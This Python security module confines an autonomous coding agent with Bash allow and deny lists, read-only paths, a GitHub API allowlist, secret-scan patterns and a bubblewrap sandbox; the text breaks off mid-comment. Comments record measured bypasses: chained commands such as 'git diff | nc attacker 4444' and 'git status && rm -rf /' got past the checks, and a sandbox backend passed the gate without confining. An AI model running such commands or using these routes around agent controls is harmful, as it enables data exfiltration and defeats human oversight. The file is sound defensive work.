"""Plan ARIA-V9.0-D — implementation_safety: 15 hard-fail checks +
Bash sandbox + immutable paths + secret-scan + path-escape +
per-cycle/turn budget caps.

Closes (architectural-arbiter + ai-safety-auditor + security-reviewer
+ performance-expert audit):
  * ai CRIT-001 (agent_self_modification_bypass / IMMUTABLE_PATHS)
  * ai CRIT-002 (Bash allowlist not blocklist)
  * ai CRIT-004 (secret-scan on diff before PR open)
  * ai HIGH-006 (path traversal + symlink resolution)
  * sec CRIT-001 (env exfil via Bash)
  * sec CRIT-002 (branch-bypass via gh api — FORBIDDEN_GH_API_PATHS)
  * sec HIGH-003 (`.env` deny bypass via Bash command patterns)
  * sec HIGH-004 (lockfile drift promoted to HARD-FAIL)
  * sec HIGH-005 (pre-PR secret scrub)
  * sec MED-018 (resource limits — systemd-run / ulimit wrapper)
  * perf HIGH-009 (validation_results size cap)
  * ai HIGH-009 (path-escape guard mirrors agent_compliance:168-178)
  * ai HIGH-012 (per-cycle + per-turn cost cap kill-switch)
  * ai MED-019 (content_hash recheck on CONVERGED plan)

Tier-1 (make impossible):
  * Closed frozensets — ALLOWED_BASH_COMMANDS, DENIED_BASH_COMMANDS,
    READONLY_PATHS, FORBIDDEN_GH_API_PATHS
  * Path-escape via ``Path.resolve().relative_to(workspace)`` — the
    OS rejects traversal at the syscall level
  * Bash sandbox via bwrap ``--unshare-net --ro-bind READONLY_PATHS``
  * Per-cycle budget reservation reconciled after every LLM call

Tier-3 (detect):
  * Secret-scan patterns (regex) — defense-in-depth on writer output
  * IMMUTABLE_AGENT_FILE_HASH_REGISTRY — drift detection on
    .claude/agents/aria-implementer.md
  * HARD_FAIL_CHECKS registry callable from orchestrator
"""
from __future__ import annotations

import os
import re
import secrets
import shlex
import shutil
import subprocess
from dataclasses import dataclass, field
from functools import lru_cache
from pathlib import Path
from collections.abc import Sequence

from . import command_policy as _command_policy
from typing import Any, Callable

from .text_safety import contains_bidi_or_control


# =============================================================================
# Constants — closed sets pinned by I-V9-IMMUTABLE-01 + I-V9-BASH-01 + I-V9-GH-01
# =============================================================================

# Plan ARIA-V9.0-D — READONLY_PATHS the implementer MUST NOT mutate
# (V9.5 hard-fail check 4). Paths are POSIX-style prefixes; the
# matcher (``verify_no_path_escape`` + path-escape guard) normalizes
# ``..`` and resolves symlinks before comparing. Adding/removing a
# path = ADR + arbiter approval + invariant amendment.
READONLY_PATHS: tuple[str, ...] = (
    ".claude/agents/",          # ai CRIT-001 self-mod (V8.13 challenger contract)
    "aria-kernel/aria_kernel/",  # kernel self-mod (Plan 009 lane)
    ".github/",                 # sec CRIT-003 workflow self-bypass
    "infrastructure/",          # infra
    "docs/adr/",                # ADR governance
    ".env",                     # secrets
    ".env.local",
    ".env.production",
    "scripts/",                 # operator tooling
    "CODEOWNERS",
    "aria-kernel/tests/invariants/",  # invariant test self-mod
    ".gitignore",               # gitignore self-edit (operator-only)
    "tools/gates/",             # commit-msg validator self-mod
    # Plan ARIA-V3.1-P-1 — extended trust boundary (closes 6-validator
    # audit C-6). Every entry below is reachable from aria-implementer
    # Bash dispatch unless explicitly blocked by the bwrap --ro-bind
    # mount layer (wrap_bash_in_sandbox iterates READONLY_PATHS).
    "tools/aria-poc/",          # ci_executor + canonical envelopes
    "tools/aria-adapters/",     # adapter trust boundary
    ".git/",                    # git plumbing self-mod (refs, objects, hooks)
    "aria-debts/",              # signing keys + installation tokens
    "aria-kernel/tests/",       # broaden from invariants/ — kernel tests read-only
)

# Plan ARIA-V9.0-D — ALLOWED_BASH_COMMANDS regex allowlist (NOT
# blocklist). aria-implementer Bash invocations matched against this
# set; any miss → BashAllowlistMiss raised. Regex anchors are deliberately
# loose to permit common flags (e.g. ``git diff --unified=0``) while
# still pinning the argv-0 binary identity.
#
# The matcher in ``verify_bash_command_allowed`` joins argv with
# spaces and tests the resulting string against each pattern; the
# first match wins. Order is irrelevant (set semantics) but each
# pattern MUST anchor at ^ to prevent partial-match smuggling.

# The one grammar for an ARIA implementation branch. Both the argv
# allowlist below and the refspec-aware ``no_force_push`` check build on
# this fragment, so "what counts as an ARIA branch" cannot drift between
# the command ARIA is allowed to run and the ref it is allowed to write.
ARIA_IMPL_BRANCH_FRAGMENT: str = _command_policy.ARIA_IMPL_BRANCH_FRAGMENT

# Plan 032 Faz 032b-2 — DERIVED from the canonical policy (command_policy.py).
# The patterns are the same matchers this module always carried; they now
# have one home that also compiles to the Claude permission layer and to
# the PreToolUse hook, and proves on examples that the enforcers agree.
ALLOWED_BASH_COMMANDS: frozenset[re.Pattern[str]] = _command_policy.allowed_regexes()
# Wave 0 §0.7 transition row — the raw `gh pr create` path the kernel CLI
# replaces. Not in ALLOWED_BASH_COMMANDS any more: it is honoured only
# while ARIA_EXECUTOR_PR_VIA_KERNEL is unset, so a lane that sets the
# flag (the scheduled executor lane does) accepts kernel-CLI PR opening
# ONLY. The flag and this pattern are deleted together after one green
# scheduled run — the two-step is tracked in
# docs/plans/2026-08-02-aria-full-autonomy-program/PLAN.md (Wave 0 §0.7).
LEGACY_GH_PR_CREATE_PATTERN: re.Pattern[str] = re.compile(
    r"^gh\s+pr\s+create\s+--base\s+main(\s+\S+)*\s*$"
)


def executor_pr_via_kernel() -> bool:
    """Whether the lane has cut over to kernel-CLI-only PR opening."""
    return os.environ.get("ARIA_EXECUTOR_PR_VIA_KERNEL") == "1"


TRUSTED_PYTHON_SCRIPT_PREFIXES: tuple[str, ...] = (
    "tools/aria-adapters/",
    "tools/aria-poc/",
    "aria-kernel/tests/_helpers/",
)
FORBIDDEN_ABSOLUTE_PYTHON_SCRIPT_PREFIXES: tuple[str, ...] = (
    "/tmp/",
    "/var/tmp/",
    "/dev/shm/",
)

# Plan ARIA-V9.0-D — DENIED_BASH_COMMANDS regex denylist. Even if a
# command somehow passed the allowlist, the deny pattern set fires
# first. Defense-in-depth. Patterns target argv-0 (the binary name)
# OR specific dangerous flags.
DENIED_BASH_COMMANDS: frozenset[re.Pattern[str]] = _command_policy.denied_regexes()

# Plan ARIA-V9.0-D — FORBIDDEN_GH_API_PATHS — even if `gh api` were
# allowed, these paths are admin/permission-sensitive and forbidden
# absolutely. Tier-1 redundant with DENIED_BASH_COMMANDS but kept
# explicit for I-V9-GH-01 invariant + dispatcher-side validation.
FORBIDDEN_GH_API_PATHS: tuple[re.Pattern[str], ...] = (
    re.compile(r"^/repos/[^/]+/[^/]+/branches/[^/]+/protection"),
    re.compile(r"^/repos/[^/]+/[^/]+/pulls/[^/]+/merge(?:[/?#].*)?$"),
    re.compile(r"^/repos/[^/]+/[^/]+/actions/"),
    re.compile(r"^/repos/[^/]+/[^/]+/secrets/"),
    re.compile(r"^/orgs/"),
)

# ORPHAN-CRITICAL-461 — the gh-api guard is an ALLOWLIST now.
#
# The five denies above were the whole control, and they missed every route
# that actually writes main. Measured before this change:
#
#     PUT  /repos/o/r/contents/CLAUDE.md    -> allowed   (commits to main)
#     PATCH /repos/o/r/git/refs/heads/main  -> allowed   (moves the tip)
#     POST /repos/o/r/merges                -> allowed
#     POST /repos/o/r/rulesets/1            -> allowed
#     POST /repos/o/r/hooks                 -> allowed
#     .../collaborators, .../keys           -> allowed
#
# Only `branches/main/protection` was caught. This one is not purely
# theoretical either: `auto_merge._gh_api_json` consults it on every call.
#
# The GitHub REST surface grows, and a denylist over a surface someone else
# extends is a control that decays without anyone editing it — the same
# lesson as ORPHAN-HIGH-443 and ORPHAN-CRITICAL-460. Enumerating what ARIA
# NEEDS is tractable because the answer is small: the only two production
# call sites are `commits/{sha}/check-runs` and `commits/{sha}/status`, both
# read-only. The PR/issue read paths below are included because they are the
# natural next reads for a merge lane and are inert; anything that is not
# here is refused, and widening it is a deliberate edit with this comment in
# view.
#
# Deny still wins over allow, so `pulls/{n}/merge` stays refused even though
# `pulls/{n}` is permitted.
ALLOWED_GH_API_PATHS: tuple[re.Pattern[str], ...] = (
    re.compile(r"^/repos/[^/]+/[^/]+/commits/[^/]+/check-runs(?:[/?#].*)?$"),
    re.compile(r"^/repos/[^/]+/[^/]+/commits/[^/]+/status(?:[/?#].*)?$"),
    # The bare collection: `POST /repos/{o}/{r}/pulls` is `gh pr create`,
    # which is the whole point of the lane, and `GET` lists. Anchored with no
    # trailing path segment so it cannot stand in for a sub-resource.
    re.compile(r"^/repos/[^/]+/[^/]+/pulls(?:[?#].*)?$"),
    re.compile(r"^/repos/[^/]+/[^/]+/pulls/[0-9]+(?:[/?#].*)?$"),
    re.compile(
        r"^/repos/[^/]+/[^/]+/pulls/[0-9]+/"
        r"(?:files|commits|reviews|comments)(?:[/?#].*)?$"
    ),
    re.compile(r"^/repos/[^/]+/[^/]+/issues/[0-9]+/comments(?:[/?#].*)?$"),
)

# Plan ARIA-V9.0-D — MAX_VALIDATION_RESULT_BYTES — per-result stdout
# / stderr persisted into state.implementation.validation_results
# capped to prevent the 30-cycle cache from bloating O(N²)
# (perf-expert PERF-HIGH-009). Hash full output separately for
# audit; persist only head+tail summary.
MAX_VALIDATION_RESULT_BYTES: int = 4096

# Plan ARIA-V9.0-D — IMMUTABLE_AGENT_FILE_HASH_REGISTRY. Populated
# when V9.1 lands .claude/agents/aria-implementer.md (computes sha256
# at land time + pins here). Drift = refusal at dispatch.
# V9.0-D ships the registry shape; V9.1 populates the hash.
IMMUTABLE_AGENT_FILE_HASH_REGISTRY: dict[str, str] = {}

# Plan ARIA-V9.0-D — SECRET_SCAN_PATTERNS. Union of
# agent_harness_security_adapter._SECRET_RES + secret_scrub
# patterns + high-entropy AWS / GH / Anthropic key formats.
# Defense-in-depth: secret-scan diff BEFORE gh pr create
# (CRIT-004 + sec HIGH-005).
SECRET_SCAN_PATTERNS: frozenset[re.Pattern[str]] = frozenset({
    re.compile(r"AKIA[0-9A-Z]{16}"),                 # AWS access key
    re.compile(r"aws_secret_access_key\s*[:=]"),     # AWS secret kv
    re.compile(r"gh[pousr]_[A-Za-z0-9]{36,}"),       # GitHub PAT (ghp/gho/...)
    re.compile(r"github_pat_[A-Za-z0-9_]{50,}"),     # GitHub fine-grained PAT
    re.compile(r"ghs_[A-Za-z0-9]{36,}"),             # GitHub App installation token
    re.compile(r"sk-ant-[A-Za-z0-9-]{32,}"),         # Anthropic API key
    re.compile(r"sk-[A-Za-z0-9]{32,}"),              # OpenAI / generic
    re.compile(r"Bearer\s+[A-Za-z0-9_.-]{32,}"),     # bearer token
    re.compile(r"-----BEGIN (RSA|EC|OPENSSH|DSA) PRIVATE KEY-----"),
    re.compile(r"-----BEGIN PGP PRIVATE KEY BLOCK-----"),
    re.compile(r"(JWT_SECRET|API_SECRET|DATABASE_PASSWORD)\s*[:=]\s*['\"]?[A-Za-z0-9+/=_-]{16,}"),
})


# =============================================================================
# Exceptions
# =============================================================================

class SecretLeakDetected(Exception):
    """Raised by ``verify_no_secret_in_diff`` /
    ``verify_no_secret_in_envelope`` when a secret pattern fires.
    Error message is REDACTED (carries pattern name + count, never the
    matched value) to prevent secret-in-error-message leak."""


class PathEscape(Exception):
    """Raised by ``verify_no_path_escape`` when a path resolves
    outside the workspace root (after ``..`` normalization +
    symlink resolution)."""


class BashAllowlistMiss(Exception):
    """Raised by ``verify_bash_command_allowed`` when an argv does not
    match any ALLOWED_BASH_COMMANDS pattern."""


class BashDenylistHit(Exception):
    """Raised by ``verify_bash_command_allowed`` when an argv matches
    a DENIED_BASH_COMMANDS pattern (even if it also matches
    ALLOWED). Deny wins over allow."""


class CommitSignatureMismatch(Exception):
    """Raised by ``verify_commit_signature`` when the signer key
    fingerprint doesn't match the cycle's registered ephemeral
    signing key."""


# =============================================================================
# Hard-fail check functions (V9.5 — 15 total)
# =============================================================================

def verify_no_secret_in_diff(diff_text: str) -> None:
    """Hard-fail check 7 — scan diff_text for secret patterns.

    Plan ARIA-V9.0-D — runs BEFORE ``gh pr create`` so secrets never
    land on GitHub. Aggregates hits by pattern name (does NOT include
    matched values in the exception message — secret-in-error leak
    prevention).

    Raises SecretLeakDetected on any hit.
    """
    hits: dict[str, int] = {}
    for pattern in SECRET_SCAN_PATTERNS:
        count = len(pattern.findall(diff_text))
        if count > 0:
            hits[pattern.pattern[:40]] = count
    if hits:
        raise SecretLeakDetected(
            f"secret pattern hits (counts only, values REDACTED): {hits}"
        )


def verify_no_secret_in_envelope(envelope: dict[str, Any]) -> None:
    """Hard-fail check — scan agent response envelope before kernel
    persists. Stringifies the envelope, runs the same secret-scan as
    diff. Defense against agent stdout / stderr / validation_results
    embedding secrets.
    """
    import json as _json
    body = _json.dumps(envelope, default=str, separators=(",", ":"))
    verify_no_secret_in_diff(body)


_GIT_VERIFY_COMMIT_FP_RE = re.compile(r"\bSHA256:[A-Za-z0-9+/]+={0,2}")


def verify_commit_signature(commit_sha: str, expected_signer_fp: str, *, repo: str | Path | None = None) -> bool:
    """Hard-fail check 1 — kernel-side commit signature verification.

    Runs ``git verify-commit --raw <sha>`` (or ``git -C <repo>``), parses
    output for the signer fingerprint, asserts equality with
    ``expected_signer_fp`` (the per-cycle ephemeral key minted by
    ``gh_token_factory.mint_signing_key``).

    Returns True on match, False on absence/mismatch (kernel-side
    raises ``CommitSignatureMismatch`` via the caller, not this
    function — keeps this as a boolean check).
    """
    if not isinstance(expected_signer_fp, str) or not expected_signer_fp.startswith("SHA256:"):
        return False
    args = ["git"]
    if repo is not None:
        args.extend(["-C", str(repo)])
    args.extend(["verify-commit", "--raw", commit_sha])
    try:
        proc = subprocess.run(args, capture_output=True, text=True, timeout=10)
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return False
    if proc.returncode != 0:
        return False
    output = (proc.stdout or "") + "\n" + (proc.stderr or "")
    match = _GIT_VERIFY_COMMIT_FP_RE.search(output)
    if not match:
        return False
    return match.group(0) == expected_signer_fp


def mint_unpredictable_feature_branch_name(plan_id: str) -> str:
    """Hard-fail check 9 (HIGH-009 branch-collision via predictable
    hash). Returns ``aria-impl-<128-bit-random-hex>``.

    secrets.token_hex(16) gives 32 lowercase hex chars (128 bits of
    entropy) — adversary cannot predict the branch name even given
    full knowledge of plan_id. The collision risk is ~2^-64 per
    cycle which is acceptable for 30-cycle endurance.
    """
    if not plan_id or not isinstance(plan_id, str):
        raise ValueError(f"plan_id must be a non-empty string, got {plan_id!r}")
    return "aria-impl-" + secrets.token_hex(16)


def verify_no_path_escape(path: str | Path, workspace_root: str | Path) -> Path:
    """Hard-fail check 9 — path-escape guard (mirror of
    agent_compliance.py:168-178 pattern). Resolves ``..`` and
    symlinks, asserts the result is inside workspace_root.

    Relative paths are interpreted relative to workspace_root (NOT
    to the current working directory) so the guard's semantics are
    independent of the caller's CWD. Absolute paths are resolved
    as-is; if the absolute path escapes workspace_root, the guard
    fires.

    Returns the resolved path on success. Raises PathEscape
    otherwise.
    """
    workspace = Path(workspace_root).resolve()
    candidate = Path(path)
    try:
        if not candidate.is_absolute():
            candidate = workspace / candidate
        resolved = candidate.resolve()
        resolved.relative_to(workspace)
    except (ValueError, OSError) as exc:
        raise PathEscape(
            f"path escapes workspace: input={path!r} workspace={workspace}"
        ) from exc
    return resolved


# Shell control operators. A command containing one of these is not one
# command — it is several, and only the first is what either list inspects.
_SHELL_OPERATOR_TOKENS: frozenset[str] = frozenset({
    "&&", "||", ";", ";;", "|", "|&", "&", "\n", "(", ")", "<", ">", ">>", "<<",
})
# Command substitution survives shlex tokenization glued to its neighbours, so
# it is matched as a substring rather than as a token.
_SHELL_SUBSTITUTION_MARKERS: tuple[str, ...] = ("`", "$(", "${", "$[")


def shell_control_operator(argv: list[str] | tuple[str, ...]) -> str | None:
    """The shell operator that makes this argv more than one command, if any.

    ORPHAN-CRITICAL-460 — the hole every other bash check sat on top of.
    `verify_bash_command_allowed` joins argv with spaces and matches patterns
    shaped `^git\\s+status(\\s+\\S+)*\\s*$`. That trailing group matches
    ANYTHING, including `&&`, so `git status && git push origin main -f`
    satisfied the allowlist. Every DENY pattern is `^`-anchored on argv-0, so
    the denylist only ever inspected the first binary and saw `git`. And
    `_check_no_force_push` reads `argv[:2] == ["git", "push"]`, which an
    allowed prefix blinds. Measured at the time: `git status && rm -rf /`,
    `git diff | nc attacker 4444` and `git status && curl http://x` were all
    ALLOWED, while their unchained forms were correctly refused.

    Tokenized rather than regex-scanned, because the distinction that matters
    is quoting: `git commit -m 'fix A && B'` contains `&&` as DATA and must
    still be allowed, while `git status && git push` contains it as an
    OPERATOR and must not. `shlex` with `punctuation_chars=True` splits
    operators into their own tokens even when unspaced (`git diff|nc x`) and
    leaves quoted text intact, which is exactly that distinction.

    A multi-element argv is checked token-by-token: it is passed to
    `subprocess` as a list, so an operator only has effect if the caller made
    it its own token. A single-element argv IS a command line and is
    tokenized. An argv that cannot be lexed at all (unbalanced quotes) is
    rejected: an unparseable command is not a verified one.
    """
    if len(argv) > 1:
        for raw in argv:
            token = str(raw)
            if token in _SHELL_OPERATOR_TOKENS:
                return token
            for marker in _SHELL_SUBSTITUTION_MARKERS:
                if marker in token:
                    return marker
        return None

    line = str(argv[0]) if argv else ""
    for marker in _SHELL_SUBSTITUTION_MARKERS:
        if marker in line:
            return marker
    lexer = shlex.shlex(line, posix=True, punctuation_chars=True)
    lexer.whitespace_split = True
    try:
        tokens = list(lexer)
    except ValueError:
        return "unlexable_command"
    for token in tokens:
        if token in _SHELL_OPERATOR_TOKENS:
            return token
    return None


def verify_bash_command_allowed(argv: list[str], *, cwd: str | Path | None = None) -> None:
    """Hard-fail check 8 — Bash allowlist (NOT blocklist).

    Joins argv with spaces, tests against:
      0. shell control operators — any hit → BashDenylistHit
      1. DENIED_BASH_COMMANDS — any hit → BashDenylistHit
      2. ALLOWED_BASH_COMMANDS — at least one MUST match → otherwise
         BashAllowlistMiss

    Order: chaining first, then deny, then allow. Chaining has to come first
    because both lists reason about a SINGLE command, and a chained argv is
    several — see :func:`shell_control_operator` (ORPHAN-CRITICAL-460).
    A command matching both deny and allow is rejected (deny wins).
    """
    if not isinstance(argv, (list, tuple)) or not argv:
        raise BashAllowlistMiss(f"argv must be a non-empty list, got {argv!r}")
    operator = shell_control_operator(argv)
    if operator is not None:
        raise BashDenylistHit(
            f"shell_control_operator_in_command: {operator!r} — argv must be one "
            f"command. Both the allow and deny lists inspect only the first "
            f"binary, so a chained command bypasses every one of them. "
            f"argv0={argv[0]!r}"
        )
    line = " ".join(str(a) for a in argv)
    for denied in DENIED_BASH_COMMANDS:
        if denied.search(line):
            raise BashDenylistHit(
                f"DENY rule hit: pattern={denied.pattern!r} argv0={argv[0]!r}"
            )
    _verify_python_script_target(argv, cwd=cwd)
    for allowed in ALLOWED_BASH_COMMANDS:
        if allowed.match(line):
            return
    # Wave 0 §0.7 — the legacy raw-PR path survives ONLY while the lane
    # has not cut over; under ARIA_EXECUTOR_PR_VIA_KERNEL=1 it falls
    # through to the allowlist miss, making kernel-CLI PR opening the
    # single reachable path in that lane.
    if not executor_pr_via_kernel() and LEGACY_GH_PR_CREATE_PATTERN.match(line):
        return
    raise BashAllowlistMiss(
        f"argv0={argv[0]!r} matches no ALLOWED_BASH_COMMANDS pattern; "
        f"see implementation_safety.ALLOWED_BASH_COMMANDS"
    )


def _verify_python_script_target(argv: list[str] | tuple[str, ...], *, cwd: str | Path | None) -> None:
    if len(argv) < 2:
        return
    executable = Path(str(argv[0])).name
    if not re.fullmatch(r"python3?(\.\d+)?", executable):
        return
    script = str(argv[1])
    if script == "-m":
        return
    if not script.endswith(".py"):
        return
    script_path = Path(script)
    if script_path.is_absolute():
        effective_absolute = script_path.as_posix()
        if not any(f"/{prefix}" in effective_absolute for prefix in TRUSTED_PYTHON_SCRIPT_PREFIXES):
            if any(effective_absolute.startswith(prefix) for prefix in FORBIDDEN_ABSOLUTE_PYTHON_SCRIPT_PREFIXES):
                raise BashAllowlistMiss("python script path must not come from tmp")
            raise BashAllowlistMiss("python script path must be trusted repo code")
        return
    raw_cwd = "." if cwd is None else str(cwd)
    cwd_path = Path(raw_cwd)
    if cwd_path.is_absolute() or ".." in cwd_path.parts:
        raise BashAllowlistMiss("python runner cwd must be workspace-relative")
    effective = _normalize_policy_path((cwd_path / script_path).as_posix())
    if not any(effective.startswith(prefix) for prefix in TRUSTED_PYTHON_SCRIPT_PREFIXES):
        raise BashAllowlistMiss(f"python script path is not trusted: {effective}")


def _normalize_policy_path(path: str) -> str:
    normalized = path.replace("\\", "/")
    parts: list[str] = []
    for part in normalized.split("/"):
        if part in ("", "."):
            continue
        if part == "..":
            raise BashAllowlistMiss("python script path must not contain traversal")
        parts.append(part)
    return "/".join(parts)


def is_gh_api_path_forbidden(path: str) -> bool:
    """Hard-fail check 8b — may ARIA call ``gh api <PATH>``?

    ORPHAN-CRITICAL-461 — an ALLOWLIST as of this change. The five deny
    patterns are kept and still win, because an explicit refusal carries a
    clearer signal than "not on the list", but a path that matches no
    ``ALLOWED_GH_API_PATHS`` entry is now refused rather than permitted.
    See the comment above that tuple for what the denylist was missing:
    every route that actually writes ``main``.
    """
    if not isinstance(path, str):
        return True  # fail closed
    stripped = path.strip()
    if not stripped:
        return True
    if any(token in stripped for token in ("{", "}", "$(", "`", ";", "&&", "||")):
        return True
    normalized = stripped if stripped.startswith("/") else "/" + stripped
    if any(p.search(normalized) for p in FORBIDDEN_GH_API_PATHS):
        return True
    return not any(p.match(normalized) for p in ALLOWED_GH_API_PATHS)


# ORPHAN-CRITICAL-439 — availability means "verifiably confines", not "is on
# PATH". Presence and capability come apart in exactly the environment this
# runs in: inside a container without unprivileged user namespaces, bubblewrap
# installs cleanly and then fails on every invocation. A PATH-only check would
# report a backend, `wrap_bash_in_sandbox` would build an argv, and the spawn
# would die at runtime — or a caller that swallowed the error would proceed
# unconfined. So each backend is probed once with the same namespace features
# the real wrapper uses, and the result is cached for the process.
#
# The probe argv MUST mirror `wrap_bash_in_sandbox`: same ro-binds (the loader
# lives under /lib64, so binding only /usr proves nothing), a tmpfs, and
# --unshare-net. A probe that exercises less than the wrapper can pass while
# the wrapper fails.
#
# ORPHAN-MEDIUM-452 — that requirement used to be a COMMENT, and the two argvs
# had already drifted: the wrapper emitted `--ro-bind /etc/alternatives` and
# `--ro-bind /etc/ssl` UNGUARDED while the probe bound neither, so on a runner
# image lacking either directory the probe reported "available" and every
# write-capable spawn then died at invocation — ORPHAN-CRITICAL-439's failure
# mode moved one step later, where it is harder to diagnose. The system paths
# are now a single tuple that both sides build from, and both sides apply the
# same existence guard, so the divergence the comment warns about is no longer
# expressible.
_SANDBOX_SYSTEM_ROOTS: tuple[str, ...] = (
    "/usr",
    "/etc/alternatives",
    "/etc/ssl",
    "/lib",
    "/lib64",
    "/bin",
)

# Name resolution. Bound ONLY when the caller asked for network, because these
# are the files that make an allowed network usable rather than nominal.
#
# Measured 2026-08-08: with `allow_network=True` the sandbox shared the host's
# network namespace and still had no `/etc/resolv.conf`, so `getent hosts
# api.anthropic.com` failed inside it and the Claude CLI hung until its timeout
# — surfacing to the executor as a bare `claude exec exited 1`. Every nightly
# agent dispatch died there, and the log said only that the CLI had failed.
#
# A sandbox that grants the network and withholds the means to use it is not a
# smaller permission; it is a permission that does not work, which is worse
# because it reads as granted.
_SANDBOX_NETWORK_FILES: tuple[str, ...] = (
    "/etc/resolv.conf",
    "/etc/hosts",
    "/etc/nsswitch.conf",
)


def _system_ro_binds() -> list[str]:
    """`--ro-bind` flags for the system paths that exist on THIS host.

    Guarded by existence for the same reason the READONLY_PATHS loop is:
    bwrap aborts the whole invocation on a bind source it cannot find, so
    an unconditional bind turns a missing `/etc/ssl` into a total failure
    of containment rather than a smaller sandbox.
    """
    flags: list[str] = []
    for root in _SANDBOX_SYSTEM_ROOTS:
        if Path(root).exists():
            flags.extend(["--ro-bind", root, root])
    return flags


def _bwrap_probe_argv() -> list[str]:
    return [
        "bwrap",
        *_system_ro_binds(),
        "--proc", "/proc",
        "--dev", "/dev",
        "--tmpfs", "/tmp",
        "--unshare-net",
        "--", "/bin/true",
    ]


_SANDBOX_PROBE_TIMEOUT_SECONDS = 15


def _sandbox_probe_succeeds(argv: Sequence[str]) -> bool:
    """True when the backend can actually build the namespaces we rely on."""
    try:
        completed = subprocess.run(
            list(argv),
            capture_output=True,
            timeout=_SANDBOX_PROBE_TIMEOUT_SECONDS,
            check=False,
        )
    except (OSError, subprocess.SubprocessError):
        return False
    return completed.returncode == 0


@lru_cache(maxsize=1)
def _bwrap_available() -> bool:
    if shutil.which("bwrap") is None:
        return False
    return _sandbox_probe_succeeds(_bwrap_probe_argv())


class SandboxUnavailable(RuntimeError):
    """No sandbox backend is present, so containment cannot be applied.

    ORPHAN-CRITICAL-427 — raised instead of returning the argv unchanged.
    The previous contract handed back a bare list on the no-backend path,
    which is indistinguishable from a sandboxed one, so every caller was
    one forgotten check away from spawning an unconfined process. Callers
    that genuinely may proceed unconfined must catch this explicitly.
    """


def sandbox_backend() -> str | None:
    """Name of the available sandbox backend, or ``None``.

    Exposed so a caller can fail closed BEFORE building a command, rather
    than discovering the absence at spawn time.

    ORPHAN-CRITICAL-451 — bwrap is the ONLY accepted backend. firejail was
    accepted here until its branch was read: it emitted
    ``firejail --quiet --private-tmp --whitelist=<workspace>`` and applied
    **none** of the eighteen READONLY_PATHS, while this function's caller
    treats a non-None return as proof that containment is in force and
    PLAN.md makes exactly that the S0 exit criterion. Choosing firejail —
    which the operator-facing refusal message actively suggested — therefore
    satisfied the criterion with the kernel fully writable. A backend that
    clears the gate without enforcing the property the gate exists for is
    strictly worse than no backend, because "spawn refused" is honest and a
    false green is not.

    firejail could be made to work (it has ``--read-only``), and that is a
    reasonable thing to add later — but only alongside a probe that
    demonstrates the confinement, the way ``_bwrap_probe_argv`` does. It is
    not added here because it cannot be verified in this environment, and
    shipping an unverified security control is the defect being closed.
    """
    if _bwrap_available():
        return "bwrap"
    return None


# Ephemeral HOME handed to a sandboxed agent runtime. Under the sandbox's own
# /tmp tmpfs, so it is created empty per run and discarded with the sandbox.
SANDBOX_HOME = "/tmp/aria-agent-home"



def scope_directories(workspace: Path, write_scope: Sequence[str]) -> list[Path]:
    """The workspace directories a write scope names, or ``[workspace]`` for
    the whole-tree scope. A glob's writable root is the path before its first
    wildcard component; entries that escape the workspace are refused."""
    dirs: list[Path] = []
    for entry in write_scope:
        text = str(entry).strip()
        if text in ("**", ".", "", "**/*"):
            return [workspace]
        parts: list[str] = []
        for part in Path(text).parts:
            if any(ch in part for ch in "*?["):
                break
            parts.append(part)
        candidate = (workspace / Path(*parts)).resolve() if parts else workspace
        try:
            candidate.relative_to(workspace)
        except ValueError as exc:
            raise PathEscape(f"write_scope_escapes_workspace:{text}") from exc
        if candidate not in dirs:
            dirs.append(candidate)
    return dirs


def _workspace_binds(workspace: Path, write_scope: Sequence[str] | None) -> list[str]:
    if write_scope is None:
        return ["--bind", str(workspace), str(workspace)]
    scoped = scope_directories(workspace, write_scope)
    if scoped == [workspace]:
        return ["--bind", str(workspace), str(workspace)]
    flags = ["--ro-bind", str(workspace), str(workspace)]
    for directory in scoped:
        if directory.is_dir():
            flags.extend(["--bind", str(directory), str(directory)])
    return flags

def wrap_bash_in_sandbox(
    argv: list[str],
    *,
    workspace_root: str | Path,
    allow_network: bool = False,
    write_scope: Sequence[str] | None = None,
    extra_ro_binds: Sequence[str | Path] = (),
) -> list[str]:
    """Hard-fail check 8c — Bash sandbox wrapper.

    Plan 032 Faz 032b — ``write_scope`` narrows the writable tree: when given,
    the workspace is mounted READ-ONLY and only the scope's directories are
    re-bound writable (``**`` / ``.`` means the whole workspace, the legacy
    shape). READONLY_PATHS are ro-bound on top either way, so a scope can
    never re-open the kernel. ``extra_ro_binds`` mounts host paths read-only
    (the managed Claude login directory is the one caller today).

    Returns the argv prefixed with bwrap flags pinning:
      * Workspace mounted writable
      * READONLY_PATHS mounted ro-bind
      * ``--unshare-net`` (no network egress) unless allow_network=True
      * ``/tmp`` mounted as tmpfs
      * No /root, /home, /etc/secrets bind

    ORPHAN-CRITICAL-427 — raises :class:`SandboxUnavailable` when no
    usable backend is present. It used to return ``argv`` unchanged
    with a comment saying the caller "should record a governance event",
    which made the unconfined path the quiet default: the function had no
    kernel caller at all, so containment existed only as prose in the
    implementer's agent file — instructions addressed to the very process
    being contained.

    ``allow_network=True`` is the correct setting when wrapping an agent
    process that must reach an API. It does NOT weaken the property that
    matters most here: READONLY_PATHS stay ro-bind, so a write under them
    fails with EROFS at the syscall level rather than by the agent
    choosing to obey.
    """
    workspace = Path(workspace_root).resolve()
    if _bwrap_available():
        # The system ro-binds come from the same helper the probe uses, so
        # the two argvs cannot drift (ORPHAN-MEDIUM-452).
        wrap = [
            "bwrap",
            *_system_ro_binds(),
            "--proc", "/proc",
            "--dev", "/dev",
            "--tmpfs", "/tmp",
            *_workspace_binds(workspace, write_scope),
            "--chdir", str(workspace),
            # The agent runtime needs a HOME it can WRITE.
            #
            # Without this the sandbox left $HOME resolvable but read-only — it
            # survives only as an implicit parent of the workspace bind, on the
            # read-only root — so the Claude CLI blocked trying to write its own
            # state and the executor reported a bare `claude exec exited 1`.
            # Every nightly agent dispatch died there; measured 2026-08-08 by
            # reproducing the exact bwrap argv, where the CLI hung until the
            # timeout and returned `OK` the moment HOME became writable.
            #
            # An EPHEMERAL home rather than a bind of the real one, and that is
            # the stronger choice: the agent gets a fresh empty directory each
            # run, so it can neither read the operator's real ~/.claude.json nor
            # leave anything behind in it. Credentials arrive through
            # CLAUDE_CODE_OAUTH_TOKEN in the environment, which is the
            # documented mechanism and does not require the config file.
            #
            # It lives under the /tmp tmpfs mounted just above, so it costs no
            # extra mount and cannot shadow the workspace bind the way a tmpfs
            # over the real home directory could when the workspace sits
            # beneath it.
            # `--tmpfs` rather than only `--setenv`: bwrap creates the mount
            # point, so the directory is guaranteed to EXIST. Setting HOME to a
